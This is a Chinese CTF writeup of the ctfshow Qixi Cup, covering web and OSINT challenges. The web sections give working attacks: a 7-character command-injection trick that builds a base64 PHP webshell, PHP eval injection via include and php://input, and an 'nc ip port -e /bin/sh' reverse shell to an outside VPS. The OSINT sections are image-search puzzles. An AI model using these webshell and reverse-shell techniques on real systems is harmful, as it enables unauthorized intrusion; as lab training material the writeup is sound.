---
title: "ctfshow 七夕杯 Web + OSINT Writeup"
date: 2022-08-05T17:30:04+08:00
draft: false
tags: ['ctf','php']
categories: ['web']
author: "X1r0z"

# weight: 1  # Top page

# You can also close(false) or open(true) something for this content.
# P.S. comment can only be closed
comment: false
toc: false
autoCollapseToc: false
---

Web 中的 easy_sql 是 Java 审计, 还没怎么学过... 就没做

OSINT 挺好玩的, 不过写 wp 的时候发现第四题被删掉了 (版权原因?)

Crypto Re Misc 只做了签到题, 就不写过来了

<!--more-->

# Web

## web签到

![20220805173309](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220805173309.png)

打开后是个命令执行界面

测试一下发现有长度限制, 最长7个字符

![20220805173355](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220805173355.png)


网上搜了一下发现一篇利用方法, 刚好也是7个字符

[https://blog.csdn.net/nzjdsds/article/details/102873187](https://blog.csdn.net/nzjdsds/article/details/102873187)

原理也很简单, 就是按照顺序利用 `>xx` 写文件名 (重定向符写入, 文件内容为空), 然后利用 `ls -t` 按时间顺序列表, 最后写进一个文件里利用 `sh` 执行

因为 Linux 的特性, `\` 表示命令输入没有结束, 会在下一行继续输入, 而 Linux 的文件名比较自由, 因此我们可以逐步将一个命令分散到多个文件之中, 然后配合上述方法执行

payload

```
echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d>1.php
```

写入

```
>hp
>1.ph\\
>d\>\\
>\ -\\
>e64\\
>bas\\
>7\|\\
>XSk\\
>Fsx\\
>dFV\\
>kX0\\
>bCg\\
>XZh\\
>AgZ\\
>waH\\
>PD9\\
>o\ \\
>ech\\
ls -t>0
sh 0
```

查看 flag

`http://f8e84766-7989-44db-8b32-a500d08a2ce0.challenge.ctf.show//api/1.php?1=system('cat /flag');`

## easy_calc

![20220805174541](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220805174541.png)

有 `preg_match()` 过滤, 而且 `$symbol` 中只能存在 `+-*/`

输入非数字报错

![20220805174716](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220805174716.png)

但是这里重点需要注意的是最上面这段

```
eval('$result='."$code".";");
echo($result);
```

发现这里的 `$code` 其实是 `$num1$symbol$num2"`

也就是说 `$num2` 后面可能会有代码注入

![20220805174931](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220805174931.png)

单引号被过滤了, 可以使用双引号测试

这里面 `()` 也被过滤, 就不能调用函数了...

想了一会发现 include 好像可以用

![20220805175050](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220805175050.png)

尝试使用伪协议 `php://input`

![20220805175132](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220805175132.png)

这里被过滤了, 原因是换行符和下面的 php 代码是算在 num2 里面的, 而 num2 又存在过滤

我们换一个参数传递代码

![20220805175223](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220805175223.png)

成功执行

flag 在 /secret 中

![20220805175251](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220805175251.png)

## easy_cmd

![20220805175813](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220805175813.png)

命令被限制死了只能执行 ping ls nc ifconfig

单独的 `escapeshellcmd()` 网上搜了一圈也没发现绕过方法

多句执行无效, `|` `<` `>` `;` 反引号都被过滤了, win 本机测试的效果是前面加上 `^`

于是换了个思路, 借了台朋友的 vps, nc 直接弹 shell

![20220805180322](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220805180322.png)

![20220805180407](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220805180407.png)

这题一开始做的时候:

想着 ifconfig 会不会是开启网卡用的, 于是 `ifconfig eth0-9 up` 都开了个遍

然后 ping 了一下我的 ceye.io 地址, 发现存在记录

最后 `nc ip port -e /bin/sh` 直接弹了个 shell 查看 flag

写 wp 的时候发现 ifconfig 和 ping 那两部其实并不需要, 直接 nc 也能谈 shell, 不太理解给剩下三个命令是什么意思...

# OSINT

## 社工签到

![osint1](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/osint1.jpeg)

flag 格式 `ctfshow{小镇名字}`

让我们找到这个小镇的名字

Google 搜图 `https://www.google.com.hk/imghp`

![20220805180909](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220805180909.png)

点开一个

![20220805180922](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220805180922.png)

`天涯镇` 一开始提交失败, 然后换成 `天涯小镇` 提交成功

后面又发了公告应该把 flag 改正过来了

## 迷失的大象

![osint2](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/osint2.jpeg)

flag 格式 `ctfshow{原籍县区全称}`

依然是搜图

![20220805181125](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220805181125.png)

这里有很多误导性信息, 根本没有提到 "喝醉遣返" 的事情

翻到第二页发现这个网址

`https://k.sina.com.cn/article_5638975650_1501bf0a2001016txn.html`

![20220805181311](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220805181311.png)

全称

![20220805181351](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220805181351.png)

## 大飞机

![osint3](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/osint3.jpg)

flag 格式 `ctfshow{航班号}`

这里 Google 搜图搜不到, 需要用国内的百度识图

`https://graph.baidu.com/pcpage/index`

第一条结果是完全一致的

![20220805181551](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220805181551.png)

`https://tieba.baidu.com/p/4924151210`

![20220805181630](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220805181630.png)

点开这个用户的个人主页, 搜索一下后没有结果

不过可以知道是国航 Air China, 并且是国际航班, 从北京首都机场到纽约机场

时间也能确定是2017年1月2日前后

但是网上的航班搜索信息基本搜不到 (限制条数 保护隐私等)

然后看了下评论区

![20220805181845](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220805181845.png)

搜了下这个 `981/2`

![20220805181913](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220805181913.png)

然后意识到这个 `981/2` 可能是 `981` 或 `982` 的意思

搜了下 `982`

![20220805181959](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220805181959.png)

航班号格式应该是 `CAxxx`

于是把 `CA981` `CA982` 都填了一下试试, 然后 `CA981` 试成功了